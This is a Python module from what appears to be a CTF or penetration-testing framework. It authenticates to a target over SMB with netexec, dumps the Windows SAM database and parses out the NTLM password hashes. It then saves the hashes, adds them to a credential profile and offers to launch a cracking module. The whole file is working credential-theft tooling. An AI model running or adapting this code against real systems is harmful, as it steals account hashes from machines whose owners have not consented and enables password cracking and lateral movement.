from pathlib import Path
from datetime import datetime
import subprocess
import argparse

from core.target import get_current_ip
from core.target import target_add_cred
from core.paths import get_artifacts_dir
from core.target import print_creds_table


def run(data, cred, args):

    # =========================================================
    # COLORS
    # =========================================================

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'
    R = '\033[91m'
    BOLD = '\033[1m'
    M = '\033[95m'

    # =========================================================
    # TARGET
    # =========================================================

    target = getattr(args, "target", None)

    if not target:
        target = get_current_ip(data)

    if not target:

        print(
            f"\n{R}[!] {W}{BOLD}NO TARGET{W}\n"
        )

        return

    # =========================================================
    # ACTIVE CREDENTIAL
    # =========================================================

    username = cred.get("user")

    secret = cred.get("secret")
    cred_type = "password"
    print(username)
    if not username:

        print(
            f"\n{R}[!] {W}{BOLD}NO ACTIVE CREDENTIAL{W}"
        )

        print(
            f"{B}  └── Use {C}ctf cred.use{W}\n"
        )

        return

    

    # =========================================================
    # REFERENCE MODE
    # =========================================================

    if getattr(args, "ref", False):

        print(
            f"\n{B}┌── {BOLD}MODULE: DUMP SAM{W}{B} ─────────────────────────┐{W}"
        )

        print(
            f"{B}└──────────────────────────────────────────────────────────┘{W}"
        )

        print(f"\n{B}[*]{W} Example\n")

        print(
            f"{Y}netexec smb "
            f"{M}<target>{Y} "
            f"-u {M}<user>{Y} "
            f"-p {M}<password>{Y} "
            f"--sam{W}\n"
        )

        return

    # =========================================================
    # ARTIFACTS
    # =========================================================

    target_name = data.get("name")


    artifact_dir = (
        get_artifacts_dir(target_name)
        / "sam"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    stamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    logfile = (
        artifact_dir /
        f"sam_dump_{stamp}.log"
    )

    hash_file = (
        artifact_dir /
        "ntlm_hashes.txt"
    )

    # =========================================================
    # HUD
    # =========================================================

    auth_type = (
        "Password"
        if cred_type == "password"
        else "NTLM"
    )

    print(
        f"\n{B}┌── {BOLD}MODULE: DUMP SAM{W}{B} ─────────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Target:{W} "
        f"{C}{str(target):<40}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}User:{W}   "
        f"{C}{username:<40}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Auth:{W}   "
        f"{C}{auth_type:<40}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└──────────────────────────────────────────────────────────┘{W}"
    )

    # =========================================================
    # COMMAND
    # =========================================================

    cmd = [
        "netexec",
        "smb",
        str(target),
        "-u",
        username,
        "--local-auth",
        "--sam",
        "--log",
        str(logfile)
    ]

    if cred_type == "password":

        cmd.extend(
            [
                "-p",
                secret
            ]
        )

    elif cred_type == "ntlm":

        cmd.extend(
            [
                "-H",
                secret
            ]
        )

    print(
        f"\n{B}[*]{W} Running\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    subprocess.run(cmd)

    # =========================================================
    # LOGFILE
    # =========================================================

    if not logfile.exists():

        print(
            f"\n{R}[!] {W}LOGFILE NOT FOUND{W}\n"
        )

        return

    lines = logfile.read_text(
        errors="ignore"
    ).splitlines()

    # =========================================================
    # PARSE HASHES
    # =========================================================

    EMPTY_NTLM = (
        "31d6cfe0d16ae931b73c59d7e0c089c0"
    )

    recovered = []

    for line in lines:

        if ":::" not in line:
            continue

        try:

            sam = line.rsplit(" ", 1)[-1]

            # Administrator:500:LMHASH:NTHASH:::
            parts = sam.split(":")

            if len(parts) < 4:
                continue

            username = parts[0]
            nthash = parts[3]

            recovered.append({
                "username": username,
                "hash": nthash
            })

        except Exception:
            pass

    # =========================================================
    # RESULTS
    # =========================================================

    if not recovered:

        print(
            f"\n{Y}[-] {W}No hashes recovered{W}\n"
        )

        return

    with open(hash_file, "w") as f:

        for entry in recovered:

            f.write(
                f"{entry['hash']}\n"
            )

    print(
        f"\n{G}[+] {W}Recovered "
        f"{C}{len(recovered)}{W} NTLM hash(es)\n"
    )

    for entry in recovered:

        print(
            f"  {B}├──{W} "
            f"{C}{entry['username']}{W} "
            f"{Y}{entry['hash']}{W}"
        )

    print()

    print(
        f"{G}[+] {W}Hashes Saved"
    )

    print(
        f"{B}  └── {C}{hash_file}{W}\n"
    )

    # =========================================================
    # SAVE TO PROFILE
    # =========================================================

    added = 0

    for entry in recovered:

        try:

            target_add_cred(
                argparse.Namespace(
                    user=entry["username"],
                    password=None,
                    hash=entry["hash"],
                    aes=None,
                    ccache=None,
                    

                ),
                show=False,
                switch=False
            )

            added += 1

        except Exception:
            pass
    print_creds_table()

    print(
        f"{G}[+] {W}Added "
        f"{C}{added}{W} hash(es) "
        f"to target profile\n"
    )

    # =========================================================
    # OPTIONAL CRACK
    # =========================================================

    answer = input(
        "Attempt to crack recovered hashes? [Y/n]: "
    ).strip().lower()

    if answer in ("", "y", "yes"):

        from core.runner import run_module_by_name

        run_module_by_name(
            "crack.me",
            [],
            data
        )

    return [
        {
            "type": "credential",
            "data": {
                "service": "sam",
                "username": x["username"],
                "hash": x["hash"]
            }
        }
        for x in recovered
    ]